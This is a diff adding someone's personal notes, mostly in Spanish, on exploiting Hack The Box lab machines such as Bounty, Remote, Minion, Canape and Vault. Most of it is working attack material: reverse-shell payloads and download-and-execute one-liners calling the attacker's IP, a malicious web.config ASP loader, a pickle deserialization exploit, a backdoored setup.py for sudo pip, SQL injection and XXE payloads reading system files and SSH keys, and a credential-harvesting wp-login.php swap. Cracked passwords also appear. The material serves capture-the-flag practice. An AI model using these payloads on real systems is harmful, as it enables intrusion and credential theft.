@@ -1,0 +1,906 @@
+#passage
+para root https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa true
+ssh root@localhost -i id_rsa     IMPORTANTE LOGEARME VIA SSH DENTRO DE MÁQUINA PASSAGE, NO DESDE LA MIA.
+
+
+
+
+sudo -S -l     cuando no funcione el sudo 
+python3 -m http.server 80   montar un servidor local en python, después en la máquina HTB wget y me descargo loq ue quiera de mi máquina.
+
+
+#bounty
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -x .asp,.aspx,.txt -u http://10.10.10.93:80 -o 10.10.10.93/recon/gobuster-medium-ext_10.10.10.93_80.txt
+http://10.10.10.93:80/transfer.aspx   sólo se pueden subir archivos con extensión web.config
+
+http://10.10.10.93/uploadedfiles
+
+Download the Nishang repository
+sudo cp /home/kali/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+sudo mv Invoke-PowerShellTcp.ps1 shell.ps1  y poner al final del fichero esto 
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 1234
+nc -nlvp 1234
+
+y subir el fuchero web.config, a continuación su contenido:
+
+cat web.config 
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+
+
+
+attrib: para ver archivos oculto en un directorio en Windows. Es decir lo que es un ls -la en Linux.
+systeminfo para ver.  Hotfix(s):                 N/A   no tiene ningún hotfix instalado.
+whoami /priv  y vemos que SetImpersonatePrivilege está habilitado, por lo que es muy probable que obtengamos SYSTEM usando Juicy Potato. Los usuarios que ejecutan el servicio del servidor SQL o el servicio IIS generalmente tienen estos privilegios habilitados por diseño. Este privilegio está diseñado para permitir que un servicio se haga pasar por otros usuarios del sistema. Juicy Potato aprovecha la forma en que Microsoft maneja los tokens para escalar los privilegios locales a SYSTEM.
+
+Descargamos potato con este comando: (new-object net.webclient).downloadfile('http://10.10.14.12/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')
+
+Ahora volvemos hacer los mismo que antes, pero cambiando algunas cosas:
+Download the Nishang repository
+sudo cp /home/kali/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+sudo mv Invoke-PowerShellTcp.ps1 shell-2.ps1  y poner al final del fichero esto 
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 6666
+nc -nlvp 6666
+./jp.exe -t * -p shell.bat -l 4444
+
+Previamente he creado el fichero shell.bat:
+powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell-2.ps1')
+y lo subimos a la víctima: 
+(new-object net.webclient).downloadfile('http://10.10.14.12/shell.bat', 'C:\Users\merlin\Desktop\shell.bat')
+
+
+
+
+
+
+#remote
+con nmap saco esto: 2049 NFS y si tiene ese puerto.
+showmount -e 10.10.10.180   se monta una carpeta
+/site__backups
+
+ahora lo monto en mi directorio: mount --types nfs 10.10.10.180:/site_backups /tmp/f
+para buscar pass y user:  grep -rn "admin@" /tmp/f       
+returns an Umbraco.sdf file
+strings /tmp/f/App_Data/Umbraco.sdf | grep admin
+
+Encuentro el hash y lo crakeo, ya tengo pass.
+Me descargo el exploit para el CMS umbruco: https://github.com/noraj/Umbraco-RCE   https://github.com/pypa/pip/issues/5448
+python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c systeminfo
+
+Descargar powercat:   https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
+python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14/powercat.ps1');powercat -c 10.10.14.14 -p 4445 -e cmd"
+nc -nvlp 4445
+
+
+
+Descargar PowerUp: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1  Esta tool es para ver como elevar privilegios.
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')
+Invoke-AllChecks
+
+Se nos proporciona la sintaxis, ya que podemos ejecutar comandos para acompañar el abuso del servicio. El comando completo Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command <command> debería permitirnos ejecutar un comando de nuestra elección. Creemos un shell con msfvenom:
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.14 lport=4444 -f exe -o shell.exe
+nc -nlvp 4444
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.14/shell.exe','C:\users\public\shell.exe')"
+Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\users\public\shell.exe"
+
+YA SOMOS ROOT.
+
+
+
+
+
+
+python 48506.py http://10.10.10.198:8080/
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.11/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.11/plink.exe','C:\xampp\htdocs\gym\upload\plink.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.11/chisel.exe','C:\xampp\htdocs\gym\upload\chisel.exe')"
+
+plink.exe -l user -p toor -R 4444:127.0.0.1:8888 10.10.14.11
+plink.exe -l user -p toor -R 5555:127.0.0.1:8888 10.10.14.11
+msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.11 4444' -b '\x00\x0a\x0d' -f py -v payload
+
+chisel.exe 10.10.14.11:9001 -R 4444:127.0.0.1:8888
+chisel.exe 10.10.14.11:9001 -R 5555:127.0.0.1:8888
+
+
+
+
+#cache
+ffuf -c -w /usr/share/wordlist/dirb/common.txt -u http://10.10.10.188   para buscar directorios ocultos.
+netstat -tulpn  y sale LISTEN en la 127.0.0.1:11211
+telnet 127.0.0.1 11211
+get user
+get passwd
+
+
+
+
+#minion
+nmap -sV -p- 10.10.10.57
+dirb http://10.10.10.57:62696 -X .asp
+http://10.10.10.57:62696/test.asp  page is vulnerable to SSRF.
+we try access localhost we find a link called system commands:
+http://10.10.10.57:62696/test.asp?u=http://127.0.0.1  y sale una shell comand donde interactuar, al meter un ls no sale nada :( vemos el código fuente de la página 
+
+http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=ls  y ahí si vemos el "ls"
+
+sudo tcpdump -i tun0 icmp        para ver las conexiones.
+
+Vamos a obtener shell:
+https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py   lo tengo guardado en mis exploits.
+ Modificar por la IP local y remota.
+ python icmp_alamot.py 
+ dir c:\  y vemos una carpeta interesante sysadmscripts y dentroe de este ls sysadmscripts
+type c.ps1
+
+
+Echamos un vistazo al contenido del archivo y encontramos que c.ps1 escribe algo dentro de un archivo que se pasa como argumento. En el archivo “del_logs.bat” crea registros dentro de log.txt dentro del directorio c: \ windows \ temp \ y encuentra que la hora cambia cada 5 minutos.
+El decodificador de usuario ejecuta el script c.ps1 cada 5 minutos y podemos sobrescribirlo con nuestra propia carga útil.
+
+Ahora cambiamos el c.ps1 original con nuestro archivo, para que podamos intentar obtener el user.txt y root.txt.
+
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> echo "dir c:\users\administrator\Desktop > c:\temp\output.txt" > c:\temp\test.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> echo "dir c:\users\decoder.MINION\Desktop >> c:\temp\output.txt" >> c:\temp\test.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> echo "copy c:\users\administrator\Desktop\root.txt c:\temp\root.txt" >> c:\temp\test.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> echo "copy c:\users\decoder.MINION\Desktop\* c:\temp\" >> c:\temp\test.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> (Get-Content c:\temp\test.ps1) | ForEach-Object { $_ -replace """", "" } | Set-Content c:\temp\test.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> copy c:\sysadmscripts\c.ps1 c:\temp\c.ps1.bak
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> copy c:\temp\test.ps1 c:\sysadmscripts\c.ps1
+[P$] iis apppool\defaultapppool@MINION sysadmscripts> cd c:\temp
+[P$] iis apppool\defaultapppool@MINION temp> dir
+    Directory: C:\temp
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---          9/4/2017   7:19 PM     103297 backup.zip                        
+-a---         9/26/2017   6:24 AM        284 c.ps1.bak                         
+-a---         9/21/2020   6:46 AM        770 output.txt                        
+-a---         9/21/2020   6:43 AM        228 test.ps1                          
+-a---         8/25/2017  11:09 AM         33 user.txt     
+
+type user.txt   ya tenemos el flag.
+
+get-content c:\temp\backup.zip -str pass
+28a5d1e0c15af9f8fce7db65d75bbf17   Ahora utilizo el site https://crackstation.net/  para descifrar el hash ntlm = 1234test
+
+net use * \\minion\c$ /user:minion\administrator 1234test
+Drive Z: is now connected to \\minion\c$.
+
+z:
+dir
+Directory: Z:\
+
+
+Mode LastWriteTime Length Name 
+---- ------------- ------ ---- 
+d---- 9/4/2017 7:42 PM accesslogs 
+d---- 8/10/2017 10:43 AM inetpub 
+d---- 8/22/2013 8:52 AM PerfLogs 
+d-r-- 9/25/2017 1:51 AM Program Files 
+d---- 8/10/2017 9:42 AM Program Files (x86) 
+d---- 8/24/2017 1:28 AM sysadmscripts 
+d---- 1/31/2019 6:01 AM temp 
+d-r-- 9/4/2017 7:41 PM Users 
+d---- 9/10/2017 10:20 AM Windows
+
+cd users
+cd administrator
+cd desktop
+ type root.txt
+In order to get the flag you have to launch root.exe located in this folder!    no nos deja abrirlo :(   Esperamos unos minutos para que se ejecute el script de PowerShell y descubrimos que pudimos extraer "user.txt" con éxito. Antes de buscar en el archivo de respaldo zip, echamos un vistazo al contenido de “output.txt” y encontramos que el archivo estaba en el directorio “c: \ users \ decoder.MINION \ Desktop”.
+
+[P$] iis apppool\defaultapppool@MINION desktop> $user = '.\administrator';$psw = '1234test';$secpsw= ConvertTo-SecureString $psw -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
+[P$] iis apppool\defaultapppool@MINION desktop> invoke-command -computername localhost -credential $credential -scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
+Ya somos root!!! y vemos la flag.
+
+
+
+
+
+#nightmare
+Crear un usuario para comprobar el SQLi y después nos autenticamos y conn ese usuario SQLi: admin ‘) order by 3# y veremos lo que escupe la base de datos:
+Username: admin ‘) order by 3#
+Password: pass
+y vemos el error sql.
+
+admin') union select 1,@@version#  para ver la versión.
+
+admin') union select 1,database()# y vemos la base de datos notes.
+
+admin') union select 1,group_concat(distinct table_schema) from information_schema.tables# y vemos la info de schema y las bases de datos.
+
+admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"# y vemos la base de datos sysadmin.
+
+admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users"# y vemos la tabla users dentro de la base de datos sysadmin,
+
+admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#  y nos muestra el contenido de username y password que es las pass dentro de la tabla sysadmin.
+
+Para obtener el user.txt necesitamos entrar con el usurio decoder que es propiestario no tenemos permisos, vamos a ver que directorios o archivos corren con este usuario:
+find / -group "decoder" 2>/dev/null
+
+Entre ellos encontramos /usr/bin/sls    Ahora, al ejecutar el comando sls, encontramos que es un archivo binario que ejecuta el comando ls. También tiene un conjunto de bits SGID, por lo que podemos abusar de esto para aumentar nuestro privilegio.
+strings /usr/bin/sls	 Usamos el comando strings para verificar el binario y encontramos que está usando la función del sistema para ejecutar el comando "ls".
+
+Ejecutamos:
+sls -b '
+bash -p'
+test user.txt
+id 
+id
+cat user.txt
+cat user.txt
+Y ya visualizamos el flag.
+
+
+
+
+
+
+
+
+#ariekei
+mirar la info de los certificados del navegador.
+probando shellshock: curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" https://beehive.ariekei.htb/cgi-bin/stats -k -v
+vulnerabilidad para subir archivos .mvg  https://imagetragick.com/  y luego nc -lvp 4444
+ver los grupos: /proc/1/cgroup    se puede ver que hay un grupo o usario docker.
+Para vulnerabilidades shellshock:  python shellshock.py  payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats
+
+ssh2john key.txt > hash_key.txt   Eata app la el formato idoneo, tengo la app guardada.
+john hash_key.txt  y el john nos da la pass rapidamente.
+
+docker run -v /:/hack -i -t bash  Encontramos que la imagen de bash está disponible para nosotros, así que usamos esto para crear una nueva imagen y montar el directorio raíz / del host dentro de una carpeta llamada / hack.
+
+
+
+#crimestoppers
+zip -0 reverse.zip reverse.php   la reverse.php la tengo la guardada en reverse.php
+con burp para introducir texto desde un archivo como zip: paste from file y pego el contenido del zip, le damos para adelante al burp, la siguiente petición nos da un churro de numeros, este pegarlo en la siguiente URL junto con %23 y reverse el nombre del zip, además de mi ip local y PHP Wrapper zip aka RCE:
+
+http://10.10.10.80/?op=zip://uploads/10.10.14.25/e0d7a2f54d16633eb0eddfb10efed8ea5a200274%23reverse
+como siempre a la escucha: 
+
+nc -lvp 1337
+
+
+
+
+#conceal
+snmp-check 10.10.10.116  o  snmpwalk -c public -v 1 10.10.10.116
+We have a password hash for the IPSEC connection : 9C8B1A372B1878851BE2C097031B6E43
+I used crackstation to crack it and I got this result : password!
+I installed strongswan to set up the IPSEC connection. With the help of the info I got from ike-scan and some guessing I could come up with this configuration which worked :
+/etc/ipsec.conf : 
+
+conn rick-to-conceal
+        authby=secret
+        auto=route
+        keyexchange=ikev1
+        ike=3des-sha1-modp1024
+        left=10.10.xx.xx
+        right=10.10.10.116
+        type=transport
+        esp=3des-sha1
+        rightprotoport=tcp
+
+
+
+/etc/ipsec.secrets :
+
+10.10.xx.xx 10.10.10.116 : PSK "Dudecake1!"
+
+
+I started ipsec then I initialized the connection :
+ipsec start
+ipsec up rick-to-conceal      NOTA IMPORTANTE: A veces no funciona se queda pillado, reiniciar con esto: ipsec restart
+
+Con todo esto que hice puedo volver a scanear con nmap y si veré puertos porque ahora estoy dentro de la VPN.
+
+
+
+#máquina cascade
+nmap -p- --min-rate 10000
+enum4linux 10.10.10.182   me sale info como "dc=cascade"
+ldapsearch -h 10.10.10.182 -p 389 -x -b "dc=cascade,dc=local"
+rpcclient -U "" 10.10.10.182
+
+smbclient -N -L //10.10.10.182
+smbmap -H 10.10.10.18
+rpcclient -U '' -N 10.10.10.182
+
+echo "clk0bjVldmE=" | base64 -d  y nos sale decodificada la pass.  rY4n5eva
+enum4linux -u r.thompson -p rY4n5eva cascade.local
+./smbclient.py r.thompson:rY4n5eva@cascade.local
+get IT/Temp/s.smith/VNC Install.reg
+cat VNC Install.reg y encontramos "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
+
+Me conecto     evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
+OSVersion.Version  para ver la servion de windows.
+net user s.smith   info sobre usuario.
+net localgroup "Audit Share"  ver info sobre el grupo en el que esta.
+Con evil-winrm no me deja descargarme nada, entonces me autentico con este programa  crackmapexec smb -u s.smith -p sT333ve2 --shares 10.10.10.182  o
+
+smbclient --user s.smith //10.10.10.182/Audit$ sT333ve2
+
+smb: \> mask ""
+smb: \> prompt OFF
+smb: \> recurse ON
+smb: \> lcd smb-audit-loot/
+smb: \> mget *
+
+
+file Audit.db  para ver que tipo de archivo es.
+Ahora abro el archivo Audit.db 
+sqlite3 Audit.db   para iniciar la base de datos esa.
+.tables        para ver kas tablas
+select * from Ldap;  seleccionar esa tabla
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local    umm una pass en base64.
+
+
+abrimos los binarios (CascAudit.exe y CascCrypto.dll) con DnSpy o cualquier otro decompilador de .NET
+Vamos a cyber chef y descriframos la password BQO5l5Kj9MdErXx6Q6AGOw==  vemos al decompliar que esta cifrado en AES, modo CBC, imput  y ouptu raw, la key la encontramos en el código c4scadek3y654321 y la key c4scadek3y654321
+Nos da la password w3lc0meFr31nd
+
+Ahora nos autenticamos con evil-winrm    evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182
+net user arksvc    vemos que esta en el grupo de delet objects
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects    vemos un mail eliminado de admin, será una pass.
+Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
+cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+baCT3r1aN00dles
+
+evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182   ya somos root!
+
+
+
+
+#máquina secnotes:
+user: admin' or 1=1 order by 2-- -    bypass login PROBAR CON LA CREACIÓN DE OTRO USUARIO CON OTRO BYPASS.
+pass: 123456
+
+
+smbclient //10.10.10.97/new-site -U "tyler"
+
+Ahora subir via smb el nc.exe y un script rev.php malicioso tal que así:
+<?php
+system('nc.exe -e cmd.exe 10.10.14.11 1337')
+?>
+
+y a la escucha el nc -lvnp 1337   y ya tenemos shell y el flag de user.
+
+cd / windows y luego haremos dir * .exe / b / s | findtr bash y esto mostrará una lista recursiva de todos los archivos exe:  dir *.exe /b/s | findstr bash
+Nos sale este directorio, C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5  nos vamos a ese directorio y ejecutamos el archivo bash.
+python -c 'import pty;pty.spawn("/bin/bash")'    para ver de forma más legible IMPORTANTE ejecutar ese python porque parece que no hay shell, pero al ejecutarlo si se ve el terminal.
+
+cat .bash_history   para ver el history de los comandos y en vemos lo siguiente:
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+> .bash_history 
+less .bash_history
+
+
+Como vemos tenemos la pass de root. Ejecutamos en mi terminal local la tool psexec.py   python3 /usr/share/doc/python3-impacket/examples/psexec.py 'administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97 cmd.exe
+Ya somos root, buscamos la flag.
+
+
+
+
+#máquina aragog:
+Para descarme un fichero de ftp  
+get test.txt
+
+XML External Entity (XXE) attack
+Si me encuentro un fichero tipo XML, puedo modificar de este modo
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<details>
+    <subnet_mask>&xxe;</subnet_mask>
+    <test></test>
+</details>
+
+Ahora lo ejecuto con curl en mi terminal
+curl -d @test.txt http://10.10.10.78/hosts.php   observese que dentro del archivo test que esta en local, en mi direcorio se encuentra la sentencia XMl antes explicada.
+
+Para ver si tienen SSH private key
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>
+<details>
+    <subnet_mask>&xxe;</subnet_mask>
+    <test></test>
+</details>
+
+curl -d @test.txt http://10.10.10.78/hosts.php
+Ahora guardo la key ssh y me autentico con por ssh, tal que así chmod 600 florian_key   y    ssh -i florian_key florian@10.10.10.78
+
+Cuando visitaba 10.10.10.78/dev_wiki, me cambiaba a aragog/dev_wiki y no me redigia correctamente. Para bypass esto hay que entrar y editar /etc/hosts tal que así
+10.10.10.78	aragog 
+
+Para elevar privilegios, Cliff nos dice dos cosas: inicia sesión con frecuencia y también está ocurriendo una restauración del sitio. sabemos que Cliff está iniciando sesión con frecuencia. Esto significaría que está presionando el archivo wp-login.php con frecuencia. Lo que podemos hacer es reemplazar el contenido de este archivo con algún código PHP para capturar su solicitud y ver qué nombre de usuario y contraseña está enviando.
+Reemplazo el contenido de wp-login.php que se encuentra en /var/www/html/dev_wiki por dumprequest.php que es un script que tengo guardado en mi arsenal, después hacemos un cat dumprequest.txt con el fichero que nos ha creado el script, hacemos su y metemos la pass, somos root.
+
+
+
+
+
+
+
+
+#máquina vault:
+Mirar bien pistas en una web, por ejemplo aquí en esta máquina primer cliente es Sparklays, me sirvio para sacar un directorio, porque los fuzzings de directorios no sacaban nada. Ahora con el direcorio nuevo sparklays vamos a lanzar de nuevo los fuzzings.
+De nuevo los direcorios que me da no encuentro nada, entro y me da un 403, no tengo permisos, pero vamos a tirar otro fuzzing con ese directorio nuevo de modo que poco a poco estoy sacando la construción de url de un sitio donde llegar.Finalmente, en /sparklays/design/design.html encontramos algo interesante
+
+bypassear los filtros de la página para php, para ello podemos utilizar el Intruder de BurpSuite, probemos a modificar la extensión del fichero. SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+Por ejemplo a mi me sirvio este: http://10.10.10.109/sparklays/design/uploads/php-reverse-shell.php5 con php reverse shell php de pentester monkey.
+
+Cuando no tengamos en una máquina nmap, Alternatively we will use nc to scan the first 100 ports like this :
+nc -zv 192.168.122.5 1-100
+Nos encontramos el puerto 80 abierto a esa máquina que hemos analizado, para poder ver su contenido tendremos que pivotar: ssh -L 1234:192.168.122.4:80 dave@10.10.10.109  Para poder ver la web a través del navegador utlizamos un tunnel SSH.
+Ahora podemos ver la web de la máquina en http://localhost:1234
+
+Cuando nos encontremos como en esta máquina /vpnconfig.php que podemos subir configuraciones de OpenVPN y ejecutarlas. Esto nos va a permitir obtener una shell reversa:
+remote 192.168.122.1
+dev tun
+nobind
+script-security 2 
+up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/1338 0>&1'"
+
+y a la escucha nc: nc -lvnp 1338
+
+MUY IMPORTANTE EL COMANDO route  para ver conexiones, en esta máquina pude ver conexiones 192.168.5.0
+y esto /var/log/auth.log ver los logs de logins. 
+
+
+MUY curuiso y útil, nmap 192.168.5.2 -Pn --source-port=4444 para ver si le digo que salgo desde un destino me da diferentes resultados el escaneo de puertos abiertos.
+
+
+
+#máquina olypus:
+Intale este exploit, ya que en la respuesta del servidor ví en las cabeceras xdebug.
+
+sudo python xdebug-shell.py --local-host 10.10.14.27 --url http://10.10.10.83/
+
+Encuentro un .cap y como no hay internet ni un wireshark ni tcpdump para sacar la info de la máquina víctima es una buena forma de sacar información hacia la máquina anfitrión:
+
+base64 /home/zeus/airgeddon/captured/captured.cap
+
+Sale un churro en base64, pues lo decodifico en cualquier página y saco el suer/pass para conectarme por ssh.
+
+Con esta info saco mucha información de un doninio:
+
+dig @10.10.10.83 ctfolympus.htb -t AXFR
+
+Los admins de sistemas tienen una forma de ocultar/filtrar puertos con knockd. Mirar después de un escaneo nmap con/sin esto:
+
+knockd 10.10.10.83 3456 6756 9088      por ejemplo, tengo que encontrar unos numeros para poder realizar la petición.
+
+Si un usuario se encuentra dentro del grupo docker se puede escalar priv con una vulnerabiliad de dcoker:
+
+docker run -v $PWD:/pwned -t crete /bin/sh -c \ 'cp /bin/sh /pwned && /bin/chown root.root /pwned/sh && chmod a+s /pwned/sh'
+
+se nos creara un fichero sh Lo ejecutamos ./sh  y ya somos root.
+
+
+#máquina canape:
+Creamos este exploit canape.py:
+import cPickle
+from hashlib import md5
+import os
+import requests
+import urllib
+
+class shell(object):
+    def __reduce__(self):
+        return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.27 443 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))
+
+quote = cPickle.dumps(shell())
+
+char = "(S'homer'\n"
+
+p_id = md5(char + quote).hexdigest()
+
+submit_url = "http://10.10.10.70/submit"
+check_url = "http://10.10.10.70/check"
+
+client = requests.session()
+
+post_data = [('character',char), ('quote',quote)]
+
+post_request = client.post(submit_url, data=post_data)
+
+post2_data = [('id',p_id)]
+
+post2_request = client.post(check_url, data=post2_data)
+
+
+
+
+lo lanzamos python canape.py    y la escucha  nc -lvnp 443
+ya estamos dentro, pero para coger el la flag user.txt tenemos que entrar con el user home, así que haremos lo siguiente:
+
+curl -X GET http://127.0.0.1:5984
+curl -X GET http://127.0.0.1:5984/_all_dbs
+curl -X GET http://127.0.0.1:5984/passwords/all_docs
+Este ultimos dos devuelve denegado no tenemos acceso, na pasa nada, pues Luckily the couchdb 2.0 version is vulnerable. Creamos el siguiente script:
+
+curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:absolomb' --data-binary '{"type":"user","name":"absolomb","roles": ["_admin"],"roles": [],"password": "supersecret"}'
+
+Ahora si funciona, ya tenemos acceso, pues nos acabamos de crear el usuario:
+curl -X GET http://absolomb:supersecret@localhost:5984/passwords/_all_docs
+{"total_rows":4,"offset":0,"rows":[
+{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
+{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
+{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
+{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
+]}
+
+
+A continuación sacando el key de cada usuario para que nos de la pass en claro: curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
+curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4                                
+{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
+www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d                                
+{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
+www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f                                
+{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
+www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738                                
+{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
+
+
+Ahora ssh homer@10.10.10.70 -p 65535 con la pass de user homer.
+
+Escalar priv:
+sudo -l
+(root) /usr/bin/pip install *   Vemos que tiene el PIP corriendo como root.
+Lanzamos el script que tenemos guardado en mi pen, aquí el exploit:
+import os
+import pty
+import socket
+
+from setuptools import setup
+from setuptools.command.install import install
+
+class MyClass(install):
+    def run(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("10.10.14.27", 443))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        os.putenv("HISTFILE",'/dev/null')
+        pty.spawn("/bin/bash")
+        s.close()
+	
+setup(
+    cmdclass={
+        "install": MyClass
+    }
+)
+
+
+python setup.py sdist  y nos creara un directorio llamado UNKNOWN-0.0.0.tar.gz
+
+Dentro de dist esta UNKNOWN-0.0.0.tar.gz lo renombramos shell.tar.gz
+Ahora lo descargamos en la máquina wget http://10.10.14.14/shell.tar.gz  dentro de la máquina victima, recordemos que estoy dentro con el usuario homer.
+
+dejamos a la escucha: nc -lvnp 443
+
+sudo /usr/bin/pip install shell.tar.gz
+
+Y ya somos root.
+
+
+
+#máquina giddy: 
+sudo python /usr/share/responder/Responder.py -I tun0    aquí dejo el responer a la espera.
+
+Ahora lanzo en el navegador la sentencia xp_dirtree:
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=28;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.27\test%27;exec%20master.dbo.xp_dirtree%20@q
+
